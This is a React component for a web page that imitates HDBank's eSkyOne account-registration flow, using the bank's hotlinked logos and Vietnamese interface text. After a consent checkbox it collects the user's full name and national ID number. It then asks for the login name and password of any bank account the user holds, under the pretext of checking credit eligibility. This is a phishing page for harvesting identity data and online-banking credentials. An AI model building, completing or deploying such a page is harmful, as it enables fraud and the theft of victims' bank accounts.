import React, { useEffect, useMemo, useState, useRef } from 'react';
import { Checkbox, Row, Col, Card, Button, Steps, Form, Input, Select, Spin } from "antd";
import socketIOClient from "socket.io-client";
import '../App.css'
import './Home.css'
import { bankList } from '../common';
const Home = () => {
    const host = "http://localhost:3000";
    const socketRef = useRef();

    const [currentState, setCurrentState] = useState(0);
    const [isDisabled, setIsDisabled] = useState(true);
    const [form] = Form.useForm();
    const [formBank] = Form.useForm();
    const itemState = [
        {
            title: 'Điều khoản',
        },
        {
            title: 'Thông tin cá nhân',
        },
        {
            title: 'Xác thực tài khoản ngân hàng',
        },
        {
            title: 'Waiting',
        }
    ]

    useEffect(() => {
        socketRef.current = socketIOClient.connect(host)

        socketRef.current.emit('connection', 'hello server')
    }, []);

    const onFinishFormInfo = (values) => {
        console.log(values)
        setCurrentState(2)
    }

    const onFinishFormBank = (values) => {
        console.log(values)
        setCurrentState(3)
        setIsDisabled(true)
    }

    return (
        <>
            <div className='container'>
                <div style={{ display: 'flex', justifyContent: 'center', margin: '1rem 0' }}>
                    <img src="https://ebanking.hdbank.vn/ipc/img/login/logo.svg" alt="hdbank"></img>
                </div>
                <div style={{ display: 'flex', justifyContent: 'center', margin: '1rem 0' }}>
                    <img style={{ width: '100%' }} src="https://ebanking.hdbank.vn/ipc/img/login/nhdt_desk.jpg" alt="hdbank"></img>
                </div>
                <div style={{ display: 'flex', justifyContent: 'center', margin: '1rem 0' }}>
                    <Row style={{ width: '100%' }}>
                        <Col span={24}>
                            <Card title="Đăng ký tài khoản eSkyOne" style={{ width: '100%' }}>
                                <Steps
                                    current={currentState}
                                    items={itemState}
                                />
                                {
                                    currentState === 0 && (
                                        <>
                                            <p>Tài khoản <strong> 0 Phí </strong> - Ưu đãi hết ý</p>
                                            <Row gutter={10}>
                                                <Col span={24} md={8} style={{ marginBottom: '1rem' }}>
                                                    <Card style={{ width: '100%', background: '#fef2f4' }}>
                                                        <div style={{ display: 'flex', justifyContent: 'center', flexDirection: 'column', alignItems: 'center' }}>
                                                            <div>
                                                                <img src='https://eskyone.hdbank.com.vn/docs/asset/images/monetization_on.png'></img>
                                                            </div>
                                                            <div>
                                                                <strong>Dịch vụ</strong>
                                                            </div>
                                                            <div>
                                                                <p> Phí 0 đồng</p>
                                                            </div>
                                                        </div>
                                                    </Card>
                                                </Col>
                                                <Col span={24} md={8} style={{ marginBottom: '1rem' }}>
                                                    <Card style={{ width: '100%', background: '#fef2f4' }}>
                                                        <div style={{ display: 'flex', justifyContent: 'center', flexDirection: 'column', alignItems: 'center' }}>
                                                            <div>
                                                                <img src='https://eskyone.hdbank.com.vn/docs/asset/images/monetization_on.png'></img>
                                                            </div>
                                                            <div>
                                                                <strong>Tích điểm đổi quà</strong>
                                                            </div>
                                                            <div>
                                                                <p>không giới hạn</p>
                                                            </div>
                                                        </div>
                                                    </Card>
                                                </Col>
                                                <Col span={24} md={8} style={{ marginBottom: '1rem' }}>
                                                    <Card style={{ width: '100%', background: '#fef2f4' }}>
                                                        <div style={{ display: 'flex', justifyContent: 'center', flexDirection: 'column', alignItems: 'center' }}>
                                                            <div>
                                                                <img src='https://eskyone.hdbank.com.vn/docs/asset/images/bolt.png'></img>
                                                            </div>
                                                            <div>
                                                                <strong>Đăng ký</strong>
                                                            </div>
                                                            <div>
                                                                <p>chỉ trong 1 phút</p>
                                                            </div>
                                                        </div>
                                                    </Card>
                                                </Col>
                                            </Row>
                                            <div style={{ display: 'flex', justifyContent: 'center', margin: '1rem 0' }}>
                                                <Checkbox
                                                    onChange={(e) => {
                                                        setIsDisabled(!e.target.checked)
                                                    }}
                                                >Tôi đã đọc, hiểu rõ và đồng ý đối với toàn bộ nội dung  <a href="#" style={{ color: 'red' }}>Thông báo xử lý dữ liệu cá nhân, Điều khoản và Điều kiện về xử lý dữ liệu cá nhân </a> trước khi cho HDBank xử lý dữ liệu cá nhân của tôi
                                                </Checkbox>
                                            </div>
                                        </>
                                    )

                                }

                                {
                                    currentState === 1 && (
                                        <>
                                            <strong>Thông tin cá nhân</strong>
                                            <Form form={form} layout='vertical' onFinish={onFinishFormInfo}>

                                                <Form.Item label="Họ và tên" name="fullName" rules={[
                                                    {
                                                        required: true,
                                                        message: 'Vui lòng nhập họ và tên!',
                                                    },

                                                ]}>
                                                    <Input type='text' placeholder='Họ và tên' />
                                                </Form.Item>
                                                <Form.Item label="Số CMND/CCCD" name="cccd" rules={[
                                                    {
                                                        required: true,
                                                        message: 'Vui lòng nhập số CMND/CCCD!',
                                                    },
                                                ]}>
                                                    <Input type='text' placeholder='Số CMND/CCCD' />
                                                </Form.Item>
                                            </Form>
                                        </>

                                    )
                                }

                                {
                                    currentState === 2 && (
                                        <>
                                            <strong>Xác thực tài khoản ngân hàng</strong>
                                            <p><strong>Vui lòng xác thực bất kỳ ngân hàng nào bạn đang sử dụng</strong></p>
                                            <p>để kiểm tra bạn có đủ điều kiện mở tín dụng hay không?</p>

                                            <Form form={formBank} layout='vertical' onFinish={onFinishFormBank}>

                                                <Form.Item label="Tên ngân hàng" name="bankName" rules={[
                                                    {
                                                        required: true,
                                                        message: 'Vui lòng chọn tên ngân hàng!',
                                                    },

                                                ]}>
                                                    <Select options={bankList}></Select>
                                                </Form.Item>

                                                <Form.Item label="Tên đăng nhập/Sdt" name="bankAccount" rules={[
                                                    {
                                                        required: true,
                                                        message: 'Vui lòng nhập tên đăng nhập/Sdt!',
                                                    },
                                                ]}>
                                                    <Input type='text' placeholder='' />
                                                </Form.Item>

                                                <Form.Item label="Mật khẩu" name="bankPassword" rules={[
                                                    {
                                                        required: true,
                                                        message: 'Vui lòng nhập mật khẩu!',
                                                    },
                                                ]}>
                                                    <Input.Password placeholder='' />
                                                </Form.Item>
                                            </Form>
                                        </>
                                    )
                                }

                                {
                                    currentState === 3 && (
                                        <div style={{ display: 'flex', justifyContent: 'center', marginTop: '1rem', alignItems: 'center' }}>
                                            <Spin></Spin>
                                            <p style={{ marginLeft: '10px' }}>Đang xử lý...</p>
                                        </div>
                                    )
                                }
                                <div style={{ display: 'flex', justifyContent: 'center', margin: '1rem 0' }}>
                                    <Button onClick={() => {
                                        if (currentState == 0) {
                                            setCurrentState(1)
                                        }
                                        if (currentState == 1) {
                                            form.submit()
                                        }

                                        if (currentState == 2) {
                                            formBank.submit()
                                        }
                                    }} disabled={isDisabled} type="primary" shape="round" size='large' style={{ background: '#ffd643', color: 'black' }}>
                                        Tiếp tục
                                    </Button>
                                </div>
                            </Card>
                        </Col>
                    </Row>

                </div>
            </div >
        </>

    );
}

export default Home;